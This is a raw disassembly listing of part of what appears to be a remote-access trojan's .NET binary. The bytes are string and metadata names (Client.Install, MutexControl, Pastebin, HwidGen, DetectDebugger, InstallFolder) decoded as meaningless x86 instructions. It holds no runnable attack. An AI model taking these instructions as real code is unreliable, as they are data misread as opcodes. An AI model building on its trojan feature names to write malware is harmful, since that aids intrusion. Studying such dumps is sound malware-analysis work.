  4086ff:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408702:	61                   	popa
  408703:	6c                   	insb   (%dx),%es:(%edi)
  408704:	00 41 72             	add    %al,0x72(%ecx)
  408707:	65 45                	gs inc %ebp
  408709:	71 75                	jno    0x408780
  40870b:	61                   	popa
  40870c:	6c                   	insb   (%dx),%es:(%edi)
  40870d:	00 67 65             	add    %ah,0x65(%edi)
  408710:	74 5f                	je     0x408771
  408712:	49                   	dec    %ecx
  408713:	6e                   	outsb  %ds:(%esi),(%dx)
  408714:	74 65                	je     0x40877b
  408716:	72 76                	jb     0x40878e
  408718:	61                   	popa
  408719:	6c                   	insb   (%dx),%es:(%edi)
  40871a:	00 73 65             	add    %dh,0x65(%ebx)
  40871d:	74 5f                	je     0x40877e
  40871f:	49                   	dec    %ecx
  408720:	6e                   	outsb  %ds:(%esi),(%dx)
  408721:	74 65                	je     0x408788
  408723:	72 76                	jb     0x40879b
  408725:	61                   	popa
  408726:	6c                   	insb   (%dx),%es:(%edi)
  408727:	00 43 6c             	add    %al,0x6c(%ebx)
  40872a:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  408731:	73 74                	jae    0x4087a7
  408733:	61                   	popa
  408734:	6c                   	insb   (%dx),%es:(%edi)
  408735:	6c                   	insb   (%dx),%es:(%edi)
  408736:	00 6b 65             	add    %ch,0x65(%ebx)
  408739:	72 6e                	jb     0x4087a9
  40873b:	65 6c                	gs insb (%dx),%es:(%edi)
  40873d:	33 32                	xor    (%edx),%esi
  40873f:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408742:	6c                   	insb   (%dx),%es:(%edi)
  408743:	00 75 73             	add    %dh,0x73(%ebp)
  408746:	65 72 33             	gs jb  0x40877c
  408749:	32 2e                	xor    (%esi),%ch
  40874b:	64 6c                	fs insb (%dx),%es:(%edi)
  40874d:	6c                   	insb   (%dx),%es:(%edi)
  40874e:	00 6e 74             	add    %ch,0x74(%esi)
  408751:	64 6c                	fs insb (%dx),%es:(%edi)
  408753:	6c                   	insb   (%dx),%es:(%edi)
  408754:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408757:	6c                   	insb   (%dx),%es:(%edi)
  408758:	00 4b 69             	add    %cl,0x69(%ebx)
  40875b:	6c                   	insb   (%dx),%es:(%edi)
  40875c:	6c                   	insb   (%dx),%es:(%edi)
  40875d:	00 50 6f             	add    %dl,0x6f(%eax)
  408760:	6c                   	insb   (%dx),%es:(%edi)
  408761:	6c                   	insb   (%dx),%es:(%edi)
  408762:	00 57 72             	add    %dl,0x72(%edi)
  408765:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  40876c:	00 
  40876d:	53                   	push   %ebx
  40876e:	65 74 41             	gs je  0x4087b2
  408771:	73 4e                	jae    0x4087c1
  408773:	75 6c                	jne    0x4087e1
  408775:	6c                   	insb   (%dx),%es:(%edi)
  408776:	00 4d 75             	add    %cl,0x75(%ebp)
  408779:	74 65                	je     0x4087e0
  40877b:	78 43                	js     0x4087c0
  40877d:	6f                   	outsl  %ds:(%esi),(%dx)
  40877e:	6e                   	outsb  %ds:(%esi),(%dx)
  40877f:	74 72                	je     0x4087f3
  408781:	6f                   	outsl  %ds:(%esi),(%dx)
  408782:	6c                   	insb   (%dx),%es:(%edi)
  408783:	00 45 6e             	add    %al,0x6e(%ebp)
  408786:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408789:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  40878d:	72 65                	jb     0x4087f4
  40878f:	61                   	popa
  408790:	6d                   	insl   (%dx),%es:(%edi)
  408791:	00 46 69             	add    %al,0x69(%esi)
  408794:	6c                   	insb   (%dx),%es:(%edi)
  408795:	65 53                	gs push %ebx
  408797:	74 72                	je     0x40880b
  408799:	65 61                	gs popa
  40879b:	6d                   	insl   (%dx),%es:(%edi)
  40879c:	00 4e 65             	add    %cl,0x65(%esi)
  40879f:	74 77                	je     0x408818
  4087a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a2:	72 6b                	jb     0x40880f
  4087a4:	53                   	push   %ebx
  4087a5:	74 72                	je     0x408819
  4087a7:	65 61                	gs popa
  4087a9:	6d                   	insl   (%dx),%es:(%edi)
  4087aa:	00 53 73             	add    %dl,0x73(%ebx)
  4087ad:	6c                   	insb   (%dx),%es:(%edi)
  4087ae:	53                   	push   %ebx
  4087af:	74 72                	je     0x408823
  4087b1:	65 61                	gs popa
  4087b3:	6d                   	insl   (%dx),%es:(%edi)
  4087b4:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b9:	64 65 46             	fs gs inc %esi
  4087bc:	72 6f                	jb     0x40882d
  4087be:	6d                   	insl   (%dx),%es:(%edi)
  4087bf:	53                   	push   %ebx
  4087c0:	74 72                	je     0x408834
  4087c2:	65 61                	gs popa
  4087c4:	6d                   	insl   (%dx),%es:(%edi)
  4087c5:	00 43 72             	add    %al,0x72(%ebx)
  4087c8:	79 70                	jns    0x40883a
  4087ca:	74 6f                	je     0x40883b
  4087cc:	53                   	push   %ebx
  4087cd:	74 72                	je     0x408841
  4087cf:	65 61                	gs popa
  4087d1:	6d                   	insl   (%dx),%es:(%edi)
  4087d2:	00 47 5a             	add    %al,0x5a(%edi)
  4087d5:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087dc:	6d                   	insl   (%dx),%es:(%edi)
  4087dd:	00 4d 65             	add    %cl,0x65(%ebp)
  4087e0:	6d                   	insl   (%dx),%es:(%edi)
  4087e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e2:	72 79                	jb     0x40885d
  4087e4:	53                   	push   %ebx
  4087e5:	74 72                	je     0x408859
  4087e7:	65 61                	gs popa
  4087e9:	6d                   	insl   (%dx),%es:(%edi)
  4087ea:	00 50 72             	add    %dl,0x72(%eax)
  4087ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ee:	67 72 61             	addr16 jb 0x408852
  4087f1:	6d                   	insl   (%dx),%es:(%edi)
  4087f2:	00 67 65             	add    %ah,0x65(%edi)
  4087f5:	74 5f                	je     0x408856
  4087f7:	49                   	dec    %ecx
  4087f8:	74 65                	je     0x40885f
  4087fa:	6d                   	insl   (%dx),%es:(%edi)
  4087fb:	00 67 65             	add    %ah,0x65(%edi)
  4087fe:	74 5f                	je     0x40885f
  408800:	49                   	dec    %ecx
  408801:	73 36                	jae    0x408839
  408803:	34 42                	xor    $0x42,%al
  408805:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  40880c:	74 
  40880d:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408814:	65 6d                	gs insl (%dx),%es:(%edi)
  408816:	00 43 6c             	add    %al,0x6c(%ebx)
  408819:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  408820:	67 6f                	outsl  %ds:(%si),(%dx)
  408822:	72 69                	jb     0x40888d
  408824:	74 68                	je     0x40888e
  408826:	6d                   	insl   (%dx),%es:(%edi)
  408827:	00 53 79             	add    %dl,0x79(%ebx)
  40882a:	6d                   	insl   (%dx),%es:(%edi)
  40882b:	6d                   	insl   (%dx),%es:(%edi)
  40882c:	65 74 72             	gs je  0x4088a1
  40882f:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408836:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  40883d:	79 
  40883e:	6d                   	insl   (%dx),%es:(%edi)
  40883f:	6d                   	insl   (%dx),%es:(%edi)
  408840:	65 74 72             	gs je  0x4088b5
  408843:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40884a:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408851:	73 
  408852:	68 41 6c 67 6f       	push   $0x6f676c41
  408857:	72 69                	jb     0x4088c2
  408859:	74 68                	je     0x4088c3
  40885b:	6d                   	insl   (%dx),%es:(%edi)
  40885c:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408860:	6d                   	insl   (%dx),%es:(%edi)
  408861:	00 52 61             	add    %dl,0x61(%edx)
  408864:	6e                   	outsb  %ds:(%esi),(%dx)
  408865:	64 6f                	outsl  %fs:(%esi),(%dx)
  408867:	6d                   	insl   (%dx),%es:(%edi)
  408868:	00 49 43             	add    %cl,0x43(%ecx)
  40886b:	72 79                	jb     0x4088e6
  40886d:	70 74                	jo     0x4088e3
  40886f:	6f                   	outsl  %ds:(%esi),(%dx)
  408870:	54                   	push   %esp
  408871:	72 61                	jb     0x4088d4
  408873:	6e                   	outsb  %ds:(%esi),(%dx)
  408874:	73 66                	jae    0x4088dc
  408876:	6f                   	outsl  %ds:(%esi),(%dx)
  408877:	72 6d                	jb     0x4088e6
  408879:	00 4d 73             	add    %cl,0x73(%ebp)
  40887c:	67 50                	addr16 push %eax
  40887e:	61                   	popa
  40887f:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  408882:	6e                   	outsb  %ds:(%esi),(%dx)
  408883:	75 6d                	jne    0x4088f2
  408885:	00 57 72             	add    %dl,0x72(%edi)
  408888:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  40888f:	65 
  408890:	61                   	popa
  408891:	6e                   	outsb  %ds:(%esi),(%dx)
  408892:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408896:	6f                   	outsl  %ds:(%esi),(%dx)
  408897:	6f                   	outsl  %ds:(%esi),(%dx)
  408898:	6c                   	insb   (%dx),%es:(%edi)
  408899:	65 61                	gs popa
  40889b:	6e                   	outsb  %ds:(%esi),(%dx)
  40889c:	00 53 65             	add    %dl,0x65(%ebx)
  40889f:	74 41                	je     0x4088e2
  4088a1:	73 42                	jae    0x4088e5
  4088a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a5:	6c                   	insb   (%dx),%es:(%edi)
  4088a6:	65 61                	gs popa
  4088a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a9:	00 48 77             	add    %cl,0x77(%eax)
  4088ac:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088b3:	65 
  4088b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b5:	00 63 68             	add    %ah,0x68(%ebx)
  4088b8:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088bf:	4d 
  4088c0:	61                   	popa
  4088c1:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088c8:	43                   	inc    %ebx
  4088c9:	68 61 69 6e 00       	push   $0x6e6961
  4088ce:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088d1:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d9:	6d                   	insl   (%dx),%es:(%edi)
  4088da:	61                   	popa
  4088db:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088e2:	43                   	inc    %ebx
  4088e3:	75 72                	jne    0x408957
  4088e5:	72 65                	jb     0x40894c
  4088e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e8:	74 44                	je     0x40892e
  4088ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4088eb:	6d                   	insl   (%dx),%es:(%edi)
  4088ec:	61                   	popa
  4088ed:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088f4:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4088f8:	00 49 73             	add    %cl,0x73(%ecx)
  4088fb:	41                   	inc    %ecx
  4088fc:	64 6d                	fs insl (%dx),%es:(%edi)
  4088fe:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  408905:	00 47 65             	add    %al,0x65(%edi)
  408908:	74 46                	je     0x408950
  40890a:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408911:	57 
  408912:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408919:	78 
  40891a:	74 65                	je     0x408981
  40891c:	6e                   	outsb  %ds:(%esi),(%dx)
  40891d:	73 69                	jae    0x408988
  40891f:	6f                   	outsl  %ds:(%esi),(%dx)
  408920:	6e                   	outsb  %ds:(%esi),(%dx)
  408921:	00 67 65             	add    %ah,0x65(%edi)
  408924:	74 5f                	je     0x408985
  408926:	4f                   	dec    %edi
  408927:	53                   	push   %ebx
  408928:	56                   	push   %esi
  408929:	65 72 73             	gs jb  0x40899f
  40892c:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408933:	74 65                	je     0x40899a
  408935:	6d                   	insl   (%dx),%es:(%edi)
  408936:	2e 49                	cs dec %ecx
  408938:	4f                   	dec    %edi
  408939:	2e 43                	cs inc %ebx
  40893b:	6f                   	outsl  %ds:(%esi),(%dx)
  40893c:	6d                   	insl   (%dx),%es:(%edi)
  40893d:	70 72                	jo     0x4089b1
  40893f:	65 73 73             	gs jae 0x4089b5
  408942:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408949:	6c                   	insb   (%dx),%es:(%edi)
  40894a:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408951:	00 53 79             	add    %dl,0x79(%ebx)
  408954:	73 74                	jae    0x4089ca
  408956:	65 6d                	gs insl (%dx),%es:(%edi)
  408958:	2e 53                	cs push %ebx
  40895a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40895e:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  408965:	68 
  408966:	65 6e                	outsb  %gs:(%esi),(%dx)
  408968:	74 69                	je     0x4089d3
  40896a:	63 61 74             	arpl   %esp,0x74(%ecx)
  40896d:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408974:	74 65                	je     0x4089db
  408976:	6d                   	insl   (%dx),%es:(%edi)
  408977:	2e 52                	cs push %edx
  408979:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40897c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408981:	6e                   	outsb  %ds:(%esi),(%dx)
  408982:	00 58 35             	add    %bl,0x35(%eax)
  408985:	30 39                	xor    %bh,(%ecx)
  408987:	43                   	inc    %ebx
  408988:	65 72 74             	gs jb  0x4089ff
  40898b:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408992:	43                   	inc    %ebx
  408993:	6f                   	outsl  %ds:(%esi),(%dx)
  408994:	6c                   	insb   (%dx),%es:(%edi)
  408995:	6c                   	insb   (%dx),%es:(%edi)
  408996:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40899b:	6e                   	outsb  %ds:(%esi),(%dx)
  40899c:	00 4d 61             	add    %cl,0x61(%ebp)
  40899f:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a0:	61                   	popa
  4089a1:	67 65 6d             	gs insl (%dx),%es:(%di)
  4089a4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089a6:	74 4f                	je     0x4089f7
  4089a8:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089ab:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089af:	6c                   	insb   (%dx),%es:(%edi)
  4089b0:	6c                   	insb   (%dx),%es:(%edi)
  4089b1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b7:	00 43 6c             	add    %al,0x6c(%ebx)
  4089ba:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c9:	00 73 65             	add    %dh,0x65(%ebx)
  4089cc:	74 5f                	je     0x408a2d
  4089ce:	50                   	push   %eax
  4089cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d0:	73 69                	jae    0x408a3b
  4089d2:	74 69                	je     0x408a3d
  4089d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d6:	00 70 6f             	add    %dh,0x6f(%eax)
  4089d9:	73 69                	jae    0x408a44
  4089db:	74 69                	je     0x408a46
  4089dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4089de:	6e                   	outsb  %ds:(%esi),(%dx)
  4089df:	00 43 72             	add    %al,0x72(%ebx)
  4089e2:	79 70                	jns    0x408a54
  4089e4:	74 6f                	je     0x408a55
  4089e6:	67 72 61             	addr16 jb 0x408a4a
  4089e9:	70 68                	jo     0x408a53
  4089eb:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089f2:	74 69                	je     0x408a5d
  4089f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4089f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f6:	00 41 72             	add    %al,0x72(%ecx)
  4089f9:	67 75 6d             	addr16 jne 0x408a69
  4089fc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089fe:	74 4e                	je     0x408a4e
  408a00:	75 6c                	jne    0x408a6e
  408a02:	6c                   	insb   (%dx),%es:(%edi)
  408a03:	45                   	inc    %ebp
  408a04:	78 63                	js     0x408a69
  408a06:	65 70 74             	gs jo  0x408a7d
  408a09:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a10:	75 6d                	jne    0x408a7f
  408a12:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a14:	74 45                	je     0x408a5b
  408a16:	78 63                	js     0x408a7b
  408a18:	65 70 74             	gs jo  0x408a8f
  408a1b:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a22:	6e                   	outsb  %ds:(%esi),(%dx)
  408a23:	6f                   	outsl  %ds:(%esi),(%dx)
  408a24:	77 6e                	ja     0x408a94
  408a26:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a29:	61                   	popa
  408a2a:	67 65 43             	addr16 gs inc %ebx
  408a2d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a2e:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a33:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a35:	00 53 65             	add    %dl,0x65(%ebx)
  408a38:	6e                   	outsb  %ds:(%esi),(%dx)
  408a39:	64 49                	fs dec %ecx
  408a3b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3c:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a3e:	00 46 69             	add    %al,0x69(%esi)
  408a41:	6c                   	insb   (%dx),%es:(%edi)
  408a42:	65 49                	gs dec %ecx
  408a44:	6e                   	outsb  %ds:(%esi),(%dx)
  408a45:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a47:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a4b:	76 65                	jbe    0x408ab2
  408a4d:	49                   	dec    %ecx
  408a4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a4f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a51:	00 46 69             	add    %al,0x69(%esi)
  408a54:	6c                   	insb   (%dx),%es:(%edi)
  408a55:	65 53                	gs push %ebx
  408a57:	79 73                	jns    0x408acc
  408a59:	74 65                	je     0x408ac0
  408a5b:	6d                   	insl   (%dx),%es:(%edi)
  408a5c:	49                   	dec    %ecx
  408a5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a5e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a60:	00 43 6f             	add    %al,0x6f(%ebx)
  408a63:	6d                   	insl   (%dx),%es:(%edi)
  408a64:	70 75                	jo     0x408adb
  408a66:	74 65                	je     0x408acd
  408a68:	72 49                	jb     0x408ab3
  408a6a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a6b:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a6d:	00 43 53             	add    %al,0x53(%ebx)
  408a70:	68 61 72 70 41       	push   $0x41707261
  408a75:	72 67                	jb     0x408ade
  408a77:	75 6d                	jne    0x408ae6
  408a79:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a7b:	74 49                	je     0x408ac6
  408a7d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a7e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a80:	00 50 72             	add    %dl,0x72(%eax)
  408a83:	6f                   	outsl  %ds:(%esi),(%dx)
  408a84:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a87:	73 53                	jae    0x408adc
  408a89:	74 61                	je     0x408aec
  408a8b:	72 74                	jb     0x408b01
  408a8d:	49                   	dec    %ecx
  408a8e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a8f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a91:	00 57 72             	add    %dl,0x72(%edi)
  408a94:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408a9b:	50 
  408a9c:	72 65                	jb     0x408b03
  408a9e:	76 65                	jbe    0x408b05
  408aa0:	6e                   	outsb  %ds:(%esi),(%dx)
  408aa1:	74 53                	je     0x408af6
  408aa3:	6c                   	insb   (%dx),%es:(%edi)
  408aa4:	65 65 70 00          	gs gs jo 0x408aa8
  408aa8:	5a                   	pop    %edx
  408aa9:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408ab0:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ab2:	74 41                	je     0x408af5
  408ab4:	70 70                	jo     0x408b26
  408ab6:	00 4d 69             	add    %cl,0x69(%ebp)
  408ab9:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408abc:	73 6f                	jae    0x408b2d
  408abe:	66 74 2e             	data16 je 0x408aef
  408ac1:	43                   	inc    %ebx
  408ac2:	53                   	push   %ebx
  408ac3:	68 61 72 70 00       	push   $0x707261
  408ac8:	47                   	inc    %edi
  408ac9:	72 6f                	jb     0x408b3a
  408acb:	75 70                	jne    0x408b3d
  408acd:	00 4e 6f             	add    %cl,0x6f(%esi)
  408ad0:	72 6d                	jb     0x408b3f
  408ad2:	61                   	popa
  408ad3:	6c                   	insb   (%dx),%es:(%edi)
  408ad4:	53                   	push   %ebx
  408ad5:	74 61                	je     0x408b38
  408ad7:	72 74                	jb     0x408b4d
  408ad9:	75 70                	jne    0x408b4b
  408adb:	00 53 79             	add    %dl,0x79(%ebx)
  408ade:	73 74                	jae    0x408b54
  408ae0:	65 6d                	gs insl (%dx),%es:(%edi)
  408ae2:	2e 4c                	cs dec %esp
  408ae4:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408aeb:	61                   	popa
  408aec:	72 00                	jb     0x408aee
  408aee:	43                   	inc    %ebx
  408aef:	68 61 72 00 49       	push   $0x49007261
  408af4:	6e                   	outsb  %ds:(%esi),(%dx)
  408af5:	76 6f                	jbe    0x408b66
  408af7:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408afb:	6d                   	insl   (%dx),%es:(%edi)
  408afc:	62 65 72             	bound  %esp,0x72(%ebp)
  408aff:	00 4d 44             	add    %cl,0x44(%ebp)
  408b02:	35 43 72 79 70       	xor    $0x70797243,%eax
  408b07:	74 6f                	je     0x408b78
  408b09:	53                   	push   %ebx
  408b0a:	65 72 76             	gs jb  0x408b83
  408b0d:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b14:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b1b:	41 
  408b1c:	43                   	inc    %ebx
  408b1d:	72 79                	jb     0x408b98
  408b1f:	70 74                	jo     0x408b95
  408b21:	6f                   	outsl  %ds:(%esi),(%dx)
  408b22:	53                   	push   %ebx
  408b23:	65 72 76             	gs jb  0x408b9c
  408b26:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b2d:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b34:	73 
  408b35:	43                   	inc    %ebx
  408b36:	72 79                	jb     0x408bb1
  408b38:	70 74                	jo     0x408bae
  408b3a:	6f                   	outsl  %ds:(%esi),(%dx)
  408b3b:	53                   	push   %ebx
  408b3c:	65 72 76             	gs jb  0x408bb5
  408b3f:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b46:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b4d:	72 
  408b4e:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b55:	64 65 72 00          	fs gs jb 0x408b59
  408b59:	49                   	dec    %ecx
  408b5a:	6e                   	outsb  %ds:(%esi),(%dx)
  408b5b:	73 74                	jae    0x408bd1
  408b5d:	61                   	popa
  408b5e:	6c                   	insb   (%dx),%es:(%edi)
  408b5f:	6c                   	insb   (%dx),%es:(%edi)
  408b60:	46                   	inc    %esi
  408b61:	6f                   	outsl  %ds:(%esi),(%dx)
  408b62:	6c                   	insb   (%dx),%es:(%edi)
  408b63:	64 65 72 00          	fs gs jb 0x408b67
  408b67:	49                   	dec    %ecx
  408b68:	64 53                	fs push %ebx
  408b6a:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b6c:	64 65 72 00          	fs gs jb 0x408b70
  408b70:	73 65                	jae    0x408bd7
  408b72:	6e                   	outsb  %ds:(%esi),(%dx)
  408b73:	64 65 72 00          	fs gs jb 0x408b77
  408b77:	4d                   	dec    %ebp
  408b78:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b7f:	74 2e                	je     0x408baf
  408b81:	43                   	inc    %ebx
  408b82:	53                   	push   %ebx
  408b83:	68 61 72 70 2e       	push   $0x2e707261
  408b88:	52                   	push   %edx
  408b89:	75 6e                	jne    0x408bf9
  408b8b:	74 69                	je     0x408bf6
  408b8d:	6d                   	insl   (%dx),%es:(%edi)
  408b8e:	65 42                	gs inc %edx
  408b90:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408b97:	61                   	popa
  408b98:	6c                   	insb   (%dx),%es:(%edi)
  408b99:	6c                   	insb   (%dx),%es:(%edi)
  408b9a:	53                   	push   %ebx
  408b9b:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408ba2:	65 
  408ba3:	72 00                	jb     0x408ba5
  408ba5:	47                   	inc    %edi
  408ba6:	65 74 45             	gs je  0x408bee
  408ba9:	6e                   	outsb  %ds:(%esi),(%dx)
  408baa:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408bad:	65 72 00             	gs jb  0x408bb0
  408bb0:	67 65 74 5f          	addr16 gs je 0x408c13
  408bb4:	42                   	inc    %edx
  408bb5:	75 66                	jne    0x408c1d
  408bb7:	66 65 72 00          	data16 gs jb 0x408bbb
  408bbb:	73 65                	jae    0x408c22
  408bbd:	74 5f                	je     0x408c1e
  408bbf:	42                   	inc    %edx
  408bc0:	75 66                	jne    0x408c28
  408bc2:	66 65 72 00          	data16 gs jb 0x408bc6
  408bc6:	57                   	push   %edi
  408bc7:	72 69                	jb     0x408c32
  408bc9:	74 65                	je     0x408c30
  408bcb:	49                   	dec    %ecx
  408bcc:	6e                   	outsb  %ds:(%esi),(%dx)
  408bcd:	74 65                	je     0x408c34
  408bcf:	67 65 72 00          	addr16 gs jb 0x408bd3
  408bd3:	67 65 74 5f          	addr16 gs je 0x408c36
  408bd7:	41                   	inc    %ecx
  408bd8:	73 49                	jae    0x408c23
  408bda:	6e                   	outsb  %ds:(%esi),(%dx)
  408bdb:	74 65                	je     0x408c42
  408bdd:	67 65 72 00          	addr16 gs jb 0x408be1
  408be1:	73 65                	jae    0x408c48
  408be3:	74 5f                	je     0x408c44
  408be5:	41                   	inc    %ecx
  408be6:	73 49                	jae    0x408c31
  408be8:	6e                   	outsb  %ds:(%esi),(%dx)
  408be9:	74 65                	je     0x408c50
  408beb:	67 65 72 00          	addr16 gs jb 0x408bef
  408bef:	47                   	inc    %edi
  408bf0:	65 74 41             	gs je  0x408c34
  408bf3:	73 49                	jae    0x408c3e
  408bf5:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf6:	74 65                	je     0x408c5d
  408bf8:	67 65 72 00          	addr16 gs jb 0x408bfc
  408bfc:	53                   	push   %ebx
  408bfd:	65 74 41             	gs je  0x408c41
  408c00:	73 49                	jae    0x408c4b
  408c02:	6e                   	outsb  %ds:(%esi),(%dx)
  408c03:	74 65                	je     0x408c6a
  408c05:	67 65 72 00          	addr16 gs jb 0x408c09
  408c09:	44                   	inc    %esp
  408c0a:	65 74 65             	gs je  0x408c72
  408c0d:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c11:	62 75 67             	bound  %esi,0x67(%ebp)
  408c14:	67 65 72 00          	addr16 gs jb 0x408c18
  408c18:	4d                   	dec    %ebp
  408c19:	61                   	popa
